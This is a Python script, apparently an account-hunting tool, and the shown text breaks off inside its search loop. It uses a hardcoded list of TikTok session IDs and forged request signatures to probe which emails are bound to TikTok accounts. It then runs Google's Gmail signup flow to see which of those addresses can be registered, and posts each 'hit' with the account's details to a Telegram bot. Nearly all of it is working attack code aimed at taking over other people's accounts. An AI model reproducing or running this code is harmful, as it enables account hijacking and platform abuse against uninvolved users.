from requests import get,post as pp,Session;from urllib.parse import urlencode;import http.client,os,re,random,string,sys,time,uuid,binascii,json;from random import choice as cc,randrange as rr,randint;from time import sleep,time;import httpx;from user_agent import generate_user_agent as ggb;import telebot;from telebot import types;from uuid import uuid4;import secrets;from datetime import datetime;from bs4 import BeautifulSoup;from ms4 import InfoTik;from cfonts import render,say;from MedoSigner import Argus,Gorgon,md5,Ladon;from concurrent.futures import ThreadPoolExecutor;from threading import Thread;import binascii;import webbrowser
E='\033[1;31m';Y='\033[1;33m';Z='\033[1;31m';X='\033[1;33m';Z1='\033[2;31m';F='\033[2;32m';A='\033[2;34m';C='\033[2;35m';S='\033[2;36m';G='\033[1;34m';HH='\033[1;34m';M='\x1b[1;37m'#الوان
from requests import get,post
try:
  from urllib.parse import urlencode
except:
  os.system('pip install pycryptodome')
try:
  import MedoSigner
except:
  os.system('pip install MedoSigner')
from random import choice,randrange
import http.client
import requests
import re
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
import os,re
import requests 
try:
	import telebot 
except:
	os.system('pip install telebot')
	os.system('pip install Pytelegrambotapi==3.7.7')
	os.system('clear')
	import telebot
from telebot import types
from uuid import uuid4
import random
from re import *
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import datetime
import secrets
import uuid
import binascii,sys
import secrets
try:
	import binascii
except:
	os.system('pip install binascii')
from concurrent.futures import ThreadPoolExecutor
import string
import threading
import time
from requests import get,post as pp,Session;from urllib.parse import urlencode;import http.client,os,re,random,string,sys,time,uuid,binascii,json;from random import choice as cc,randrange as rr,randint;from time import sleep,time;import httpx;from user_agent import generate_user_agent as ggb;import telebot;from telebot import types;from uuid import uuid4;import secrets;from datetime import datetime;from bs4 import BeautifulSoup;from ms4 import InfoTik;from cfonts import render,say;from MedoSigner import Argus,Gorgon,md5,Ladon;from concurrent.futures import ThreadPoolExecutor;from threading import Thread;import binascii;import webbrowser
E='\033[1;31m';Y='\033[1;33m';Z='\033[1;31m';X='\033[1;33m';Z1='\033[2;31m';F='\033[2;32m';A='\033[2;34m';C='\033[2;35m';S='\033[2;36m';G='\033[1;34m';HH='\033[1;34m';M='\x1b[1;37m'#الوان
hit,ge,be,gt,bt=0,0,0,0,0
import os

iid =input('~  𝗶𝗱 𝗚𝗶𝗿 : ') 

tok=input('~  𝗧𝗼𝗸𝗲𝗻 𝗚𝗶𝗿 : ')

os.system('clear')


def luffy_info(email):
  global hit, iid, tok
  hit += 1
  email = str(email)
  user = email.split('@')[0]
  try:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://omar-thing.nekoweb.org/',
        'Content-Type': 'application/json',
        'Origin': 'https://omar-thing.nekoweb.org',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Priority': 'u=0',
    }
    json_data = {
        'username': user,
    }
    r = requests.post(
        'https://nodejs-serverless-function-express-ivory-ten.vercel.app/api/hello',
        headers=headers,
        json=json_data,
    ).json()
    id = r['userId']
    user = user  
    name = r['nickname']
    folon = r['stats']['following']
    folos = r['stats']['followers']
    lik = r['stats']['hearts']
    vid = r['stats']['videos']
    account_created = r['accountCreated'].split(',')[0].strip()
    nickname_modified = r['nicknameModified'].split(',')[0].strip() if r['nicknameModified'] != '' else ''
    avatar = r['avatar']
    ff = (f'''
*~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
- - - - - - - - - - - - - - - - - - - - - - - - - -*
*~ 𝐇𝐢𝐭 : [* `{hit}` *]*
*~ 𝗡𝗮𝗺𝗲 : [* `{name}` *]*
*~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [* `{user}` *]*
*~ 𝗚𝗺𝗮𝗶𝗹 : [* `{email}@gmail.com` *]*
*~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : [* `{folos}` *]*
*~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : [* `{folon}` *]*
*~ 𝗟𝗜𝗞𝗘 : [* `{lik}` *]*
*~ 𝗶𝗱 : [* `{id}` *]*
*~ 𝗩𝗜𝗗𝗘𝗢 : [* `{vid}` *]*
*~ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁-𝗖𝗿𝗲𝗮𝘁𝗲𝗱 : [* `{account_created}` *]*
*~ 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲-𝗠𝗼𝗱𝗶𝗳𝗶𝗲𝗱 : [* `{nickname_modified}` *]*
*- - - - - - - - - - - - - - - - - - - - - - - - - -*
''')
    fff = (f'''
~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
- - - - - - - - - - - - - - - - - - - - - - - - - -
~ 𝐇𝐢𝐭 : [ {hit} ]
~ 𝗡𝗮𝗺𝗲 : [ {name} ]
~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [ {user} ]
~ 𝗚𝗺𝗮𝗶𝗹 : [ {email}@gmail.com ]
~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : [ {folos} ]
~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : [ {folon} ]
~ 𝗟𝗜𝗞𝗘 : [ {lik} ]
~ 𝗶𝗱 : [ {id} ]
~ 𝗩𝗜𝗗𝗘𝗢 : [ {vid} ]
~ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁-𝗖𝗿𝗲𝗮𝘁𝗲𝗱 : [ {account_created} ]
~ 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲-𝗠𝗼𝗱𝗶𝗳𝗶𝗲𝗱 : [ {nickname_modified} ]
- - - - - - - - - - - - - - - - - - - - - - - - - -
''')
    goldkk = {'inline_keyboard': [[
                {'text': ' 𝗧𝗼𝗼𝗹 𝗕𝘆', 'url': 'https://t.me/BatuX28'}
            ]]}
    requests.post(f'https://api.telegram.org/bot{tok}/sendPhoto',json={'chat_id': iid,'photo': avatar,'caption': ff,'parse_mode': 'Markdown','reply_markup': json.dumps(goldkk)})
    print(fff)
  except:  
    ff = (f'''
*~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
*- - - - - - - - - - - - - - - - - - - - - - - - - -*
*~ 𝐇𝐢𝐭 : [* `{hit}` *]*
*~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [* `{user}` *]*
*~ 𝗚𝗺𝗮𝗶𝗹 : [* `{email}@gmail.com` *]*
*- - - - - - - - - - - - - - - - - - - - - - - - - -*
''')
    fff = (f'''
~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
- - - - - - - - - - - - - - - - - - - - - - - - - -
~ 𝐇𝐢𝐭 : [ {hit} ]
~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [ {user} ]
~ 𝗚𝗺𝗮𝗶𝗹 : [ {email}@gmail.com ]
- - - - - - - - - - - - - - - - - - - - - - - - - -
''')
    requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff) + "&parse_mode=Markdown")
    print(fff)
    
    
    
def vip_gmail(email): 
    global hit,ge,be,gt,bt
    if '@' in email:email=email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5,10)))
    birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
    s = requests.Session()
    headers={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US,en;q=0.9','referer':'https://accounts.google.com/','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-browser-channel':'stable','x-browser-copyright':'Copyright 2024 Google LLC. All rights reserved.','x-browser-year':'2024'}
    params={'biz':'false','continue':'https://mail.google.com/mail/u/0/','ddm':'1','emr':'1','flowEntry':'SignUp','flowName':'GlifWebSignIn','followup':'https://mail.google.com/mail/u/0/','osid':'1','service':'mail'}
    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl=response.url.split('TL=')[1]
    s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':f'["{s1}"]','x-same-domain':'1'}
    params={'rpcids':'E815hb','source-path':'/lifecycle/steps/signup/name','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers, 
        data=data,
    ).text
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':f'["{s1}"]','x-same-domain':'1'}
    params={'rpcids':'eOY7Bb','source-path':'/lifecycle/steps/signup/birthdaygender','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text 
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':'["'+s1+'"]','x-same-domain':'1'}
    params={'rpcids':'NHJMOd','source-path':'/lifecycle/steps/signup/username','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text 
    if "password"in response:
        luffy_info(email)
        os.system('cls'if os.name=="nt"else"clear")
        ge+=1
        print(f"\r < ¦   {F} Hit  {HH}: {M}[{ge}] ~ {Z} False {HH}: {M}[{bt}] ~ {X} Bad {HH}: {M}[{be}] {G}                                                                         By :) : @BatuX28 ¦ > \r")   
    else:
        os.system('cls'if os.name=="nt"else"clear")
        be+=1
        print(f"\r < ¦   {F} Hit  {HH}: {M}[{ge}] ~ {Z} False {HH}: {M}[{bt}] ~ {X} Bad {HH}: {M}[{be}] {G}                                                                         By :) : @BatuX28 ¦ > \r")   
        
        
        
        

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
    if not unix:
        unix = int(time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }


 
        
        
def vip_priv(email):
    global a, hit, ge, be, gt, bt
    try:
        secret = secrets.token_hex(16)
        session = requests.Session()
        new_uuid = str(uuid.uuid4()).replace('-', '')   
        sid_tt = f"sid_tt={new_uuid[:16]}; "        
        session_id = [
    "df7a17980c069db2316fc6d8e668cacf",
    "65c6dd105c5248895834a5741498129d",
    "6c660a20292158a17086f76ea489596b",
    "57b1bb14939a7ffee8e8cf7ae1e58b64",
    "c66892b3b7062a2287f338d3c75d28b5",
    "31b2653d315ad2df648c59be4dd3c97b",
    "6f3fcaabd10994c4d6f3c8987a02c11b",
    "97979e4ead059d1bf51f8048a6038a44",
    "6f3fcaabd10994c4d6f3c8987a02c11b",
    "c44bdacce13656aa68928a267a00885d",
    "69db14f49c65f829ba228fb674dc5783",
    "5121da46ebd6908c661f204eb1bdf390",
    "cd9dd1c4b4598d7a95dc4d296c055e4c",
    "a948087e8602647aa2417b71401b98c8",
    "7bc7638f77025b0c8f397913adb23944",
    "49962c217f3b05f2bc46f1ce1382b664",
    "12982ad9ea91dcf1a21027dd75eb7715",
    "733a6bc05f842ec198e5dcc00f4c8f40",
    "5afb092e4e8b8f317afd0ca790dd4b12",
    "7eab67b617139a5cd4d54acb74a981ec",
    "05946e47542c4bfb7dd1029ac9d02d9f",
    "4db80548f0721446810b97976d10ff86",
    "e624931c16f25073c9e093afb176687d",
    "f09b99f844ee2f52ae2bdb2f02213476",
    "4efef2ff09e8b18333e2b6c034fe176f",
    "a3067782e3d4b93ab55a83d457d649d5",
    "6442d7441baebb712abb3338fc78cad9",
    "eefab72e2f1762a8a18b8b0086bd573b",
    "b726ff6545886c22891c518b1ab2c018",
    "60cdc8b6807824fb826bc2bc2d6a86a3",
    "a6101eaebf59dda2c9245d29a78c794f",
    "5b4a65219248b9db66c9515262a95c74",
    "8bcd84fa7de6e259a5c658044669e08d",
    "40dd05308b13c1e962c604610049a5a8",
    "a21fed4ad4391fe6345f89fd5d109d08",
    "4298d8be202d8467a9ae2037ad315fe3",
    "90291ed7f741eacab2d7614948fdff52",
    "3a0cee07f322f7457e28d714b7f2e141",
    "015c4a476e9acd03ba1f97aab24bdd2f",
    "12e2daf9d50b9fdc780e638e69194299",
    "b913fc96feca30139330f83a3ac1f729",
    "e477678baa3953e2fa8e9249ea79ad3a",
    "2882760c9261f6704d5cabc5f5d6303d",
    "2c50e29900b739b4cbee1636512b533f",
    "3117d32622cfe4f1a04affe33798d587",
    "c6f2a194ac4ab96886e98979b85de2e6",
    "1cd90a76406ca914523138fa3be9fea3",
    "6432c4926bd4c145bccd4ac5f18013ce",
    "2108c7131efe9a342cfce5d4b612407c",
    "8cc651649cac98d1c4f2dce85c3bccc1",
    "7a5228775d3c86d3ea96290d1f44452a",
    "20cf68252042beaec01ab1a5f6d9dab7",
    "75816ca2320f9b5c276463aa3f9ea4aa",
    "af47a38857344ca39cc36e26a5097cf4",
    "d6d3cf94b0563b8bf6edf3b07950bd1e",
    "b41eb8a42aa2b791c17be87221a0772e",
    "1d002ac4394cddf8f710613aab3ed625",
    "3ba67d338f3a5424480d543ef82ef309",
    "b7a87b85e06ca8353910e6cfe5f70bd0",
    "21ba39babbba73992f24f0f126bf7a55",
    "9358abde75ed36b6f3e93bd5ff3ec77e",
    "61ffb2a4b1dd47b8fd6b01c8bd02eafe",
    "0b6883c0978c35b4c3ba23f29d5001c2",
    "afa9e2bfc0613ea961861b8b6dece2ce",
    "98388165c3d4844e657e7836dd2cc78a",
    "6df7d11af8d417aa33e57cfef088410b",
    "b5f30ae6ff9496f7a6561bc1a06ca0b4",
    "60d18cd7da97db29a026689b60dbdc71",
    "79a5c086b83221fbcc3e395bcb5b6bee",
    "4e5da564b32ebe325db4bd6196a728cc",
    "8a8d3dcf2e14c54e51b4591f05c0cc76",
    "6b8927ba0bccb085c17b3db2e70d53cd",
    "e6804d1d23b27a1968a7962dcb9bc1ae",
    "8b5f042c870218867df2c33497778572",
    "20c9b65cc050f5e6eb0289dcb98f95c4",
    "ae0e18816d946762e3c3392a221f198e",
    "0b4176ee5aa2413b319d673d6cab1b81",
    "ce5a2dc13ab715c967d333b24236f7d7",
    "645d465c63003f506c752cd5a97c1e82",
    "7cadbdf13b0b5d74f624634a92d46f11",
    "57e968a0e406fee2f33a832e21aff59a",
    "1f0d6ce685ca5d9f8fad66e9c0ca8b78",
    "87cb87491d35c9addc62dc8da130a316"
]
        sessionid = random.choice(session_id)
        cookies={"passport_csrf_token":secret,"passport_csrf_token_default":secret,"sessionid":sessionid}      
        session.cookies.update(cookies)
        params={'passport-sdk-version':"6030790",'iid':str(random.randint(1,10**19)),'device_id':str(random.randint(1,10**19)),'ac':"WIFI",'channel':"googleplay",'aid':"1233",'app_name':"musical_ly",'version_code':"360505",'version_name':"36.5.5",'device_platform':"android",'os':"android"}
        mkk = sign(params=urlencode(params), payload="", cookie="")
        headers={'User-Agent':'com.zhiliaoapp.musically/2023208030(Linux;U;Android9;en;G011A;Build/PI;tt-ok/3.12.13.4-tiktok)','x-tt-passport-csrf-token':secret,'content-type':"application/x-www-form-urlencoded;charset=UTF-8",'x-argus':mkk["x-argus"],'x-gorgon':mkk["x-gorgon"],'x-khronos':mkk["x-khronos"],'x-ladon':mkk["x-ladon"]}
        response = session.post("https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/", params=params, headers=headers, data={"email": email})
        if "Email is linked to another account. Unlink or try another email" in response.text:
            vip_gmail(email)
            print(response.text)
            os.system('cls' if os.name == 'nt' else 'clear')
            gt += 1
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            bt += 1
            print(f"\r < ¦   {F} Hit  {HH}: {M}[{ge}] ~ {Z} False {HH}: {M}[{bt}] ~ {X} Bad {HH}: {M}[{be}] {G}                                                                         By :) : @BatuX28 ¦ > \r")   
    except ValueError:
        print(f"#Vpn Aç")
    except requests.RequestException as e:
        print(f" Vpn Aç")
        
        
        
        
               
               
                
                 
                   
def luffy_shelby():
        while True:
            try:
                g=choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )

                keyword=''.join((choice(g) for i in range(randrange(4,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))
               
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
                luffys = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=tr&app_name=tiktok_web&battery_info=0.84&browser_language=tr-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=luffys&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Avrupa%2Fİstanbul&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=tr&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = luffys.cookies.get_dict()['msToken']
